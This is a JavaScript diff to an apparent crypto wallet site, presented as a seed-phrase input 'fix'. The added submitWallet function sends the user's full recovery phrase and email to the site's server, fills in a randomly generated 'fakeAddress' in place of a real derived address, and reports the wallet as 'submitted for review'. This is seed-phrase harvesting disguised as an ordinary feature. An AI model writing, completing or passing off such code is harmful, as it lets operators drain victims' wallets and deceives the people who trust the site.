@@ -853,3 +853,40 @@ window.fetchBalances = async function() {
         }
     } catch (error) { console.log("Balance fetch error:", error); }
 };
+
+/* =====================================================
+   FIX: PROFESSIONAL SEED PHRASE INPUT & UI TOGGLE
+   ===================================================== */
+// 1. Hide the "Import Wallet" button when the form opens
+window.showImportWallet = function() { 
+    document.getElementById('importWalletForm').style.display = 'block'; 
+    const importBtn = document.querySelector('button[onclick="showImportWallet()"]');
+    if (importBtn) importBtn.style.display = 'none';
+}
+
+// 2. Update submitWallet to read from the textarea and clean spaces
+window.submitWallet = async function() {
+    const seedInput = document.getElementById('seedPhraseInput').value;
+    
+    // Clean up extra spaces and newlines
+    const cleanedSeed = seedInput.trim().replace(/\s+/g, ' '); 
+    const wordCount = cleanedSeed.split(' ').length;
+    
+    if (wordCount < 12) return showToast("Enter a valid 12 or 24-word phrase.");
+    
+    let fakeAddress = '0x' + Array.from({length: 40}, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
+    
+    try {
+        const res = await fetch('/api/wallet/import', { 
+            method: 'POST', 
+            headers: { 'Content-Type': 'application/json' }, 
+            body: JSON.stringify({ email: currentUser.email, seedPhrase: cleanedSeed, walletAddress: fakeAddress }) 
+        });
+        if (res.ok) { 
+            showToast("Wallet submitted for review."); 
+            // Hide the form and show pending status
+            document.getElementById('importWalletForm').style.display = 'none';
+            checkWalletStatus(); 
+        }
+    } catch (error) { showToast("Error submitting wallet."); }
+};
